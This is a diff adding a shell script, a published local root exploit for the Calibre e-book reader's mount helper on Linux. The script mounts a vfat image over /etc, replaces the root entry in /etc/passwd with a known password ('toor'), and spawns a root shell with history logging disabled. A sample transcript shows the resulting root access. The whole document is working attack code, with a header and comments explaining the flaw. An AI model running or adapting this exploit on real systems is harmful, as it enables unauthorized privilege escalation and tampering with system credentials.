@@ -1,0 +1,82 @@
+# Exploit Title: .60-Calibrer Assault Mount: Another Calibre E-Book Reader Local Root
+# Date: Nov 2, 2011
+# Author: zx2c4
+# Software Link: http://calibre-ebook.com/
+# Tested on: Gentoo
+# Platform: Linux
+# Category: Local
+# CVE: pending
+#!/bin/sh
+
+                  #######################################
+                  #     .60-Calibrer Assault Mount      #
+                  #              by zx2c4               #
+                  #######################################
+
+################################################################################
+# Yesterday we learned how Calibre's usage of execlp allowed us to override PATH
+# and get root, in my ".50-Calibrer Assault Mount" exploit. Today we exploit a
+# more fundumental issue with Calibre's mount helper -- namely, that it allows
+# us to mount a vfat filesystem anywhere we want. By mounting a file system
+# image over /etc, we are able to tinker /etc/passwd and make the root password
+# temporarily "toor".
+#
+# - zx2c4
+# 2011-11-2
+#
+# Usage:
+# $ ./60calibrerassaultmount.sh 
+# [+] Making temporary directory: /tmp/tmp.OGgS0jaoD4
+# [+] Making overlay image:
+# 51200+0 records in
+# 51200+0 records out
+# 26214400 bytes (26 MB) copied, 0.100984 s, 260 MB/s
+# mkfs.vfat 3.0.11 (24 Dec 2010)
+# [+] Mounting overlay image using calibre-mount-helper.
+# [+] Copying /etc into overlay.
+# [+] Tampering with overlay's passwd.
+# [+] Unmounting overlay image using calibre-mount-helper.
+# [+] Mounting overlay to /etc using calibre-mount-helper.
+# [+] Asking for root. When prompted for a password, enter 'toor'.
+# Password: [typed in toor to the terminal] 
+# [+] Unmounting /etc using root umount.
+# [+] Cleaning up: /tmp/tmp.OGgS0jaoD4
+# [+] Getting shell.
+# sh-4.2# id
+# uid=0(root) gid=0(root) groups=0(root)
+# sh-4.2# whoami
+# root
+# sh-4.2# 
+################################################################################
+
+
+echo "#######################################"
+echo "#     .60-Calibrer Assault Mount      #"
+echo "#              by zx2c4               #"
+echo "#######################################"
+echo
+echo -n "[+] Making temporary directory: "
+dir="$(mktemp -d)"
+echo "$dir"
+cd "$dir"
+echo "[+] Making overlay image:"
+dd if=/dev/zero of=overlay count=51200
+/usr/sbin/mkfs.vfat overlay
+echo "[+] Mounting overlay image using calibre-mount-helper."
+mkdir staging
+calibre-mount-helper mount overlay staging
+echo "[+] Copying /etc into overlay."
+cd staging/
+cp -a /etc/* . 2>/dev/null
+echo "[+] Tampering with overlay's passwd."
+cat passwd | tail -n +2 > tmp
+echo "root:$(echo -n 'toor' | openssl passwd -1 -stdin):0:0:root:/root:/bin/bash" >> tmp
+mv tmp passwd
+echo "[+] Unmounting overlay image using calibre-mount-helper."
+cd ..
+calibre-mount-helper eject overlay staging >/dev/null 2>&1
+echo "[+] Mounting overlay to /etc using calibre-mount-helper."
+calibre-mount-helper mount overlay /etc  >/dev/null 2>&1
+cd /
+echo "[+] Asking for root. When prompted for a password, enter 'toor'."
+su -c "echo \"[+] Unmounting /etc using root umount.\"; umount /etc; echo \"[+] Cleaning up: $dir\"; rm -rf \"$dir\"; echo \"[+] Getting shell.\"; HISTFILE=\"/dev/null\" exec /bin/sh"
